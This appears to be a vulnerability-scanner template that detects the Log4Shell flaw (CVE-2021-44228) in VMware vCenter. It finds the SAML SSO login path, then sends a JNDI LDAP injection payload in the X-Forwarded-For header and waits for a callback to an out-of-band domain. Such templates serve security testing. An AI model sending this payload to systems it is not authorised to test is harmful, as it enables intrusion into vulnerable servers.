name: VMware_vCenter_Log4shell_CVE-2021-44228_(1)
transport: http
set:
  reverse: newReverse()
  reverseDomain: reverse.domain
detail:
  dock: app="VMware-vCenter" || body="vsphere-client/" || title="VMware vSphere"
  product: VMware vCenter
  homepage: https://www.vmware.com/
  impact: The vsphere-client /websso/SAML2/SSO/ address has a log4j vulnerability.
  description: VMware vCenter Server is advanced server management software that provides
    a centralized platform for controlling your VMware vSphere environments, allowing
    you to automate and deliver a virtual infrastructure across the hybrid cloud with
    confidence.
rules:
  r1:
    method: GET
    path: /ui/login
    follow_redirects: false
    output:
      search_vmid: r'(?P<vmid>/websso/SAML2/SSO/.*SAMLRequest=)'.bsubmatch(response.raw_header)
      var_vmid: search_vmid['vmid']
    expression: response.status == 302
  r2:
    method: GET
    path: '{{var_vmid}}'
    follow_redirects: false
    headers:
      X-Forwarded-For: ${jndi:ldap://{{reverseDomain}}/tea}
    expression: reverse.wait(5)
expression: r1() && r2()
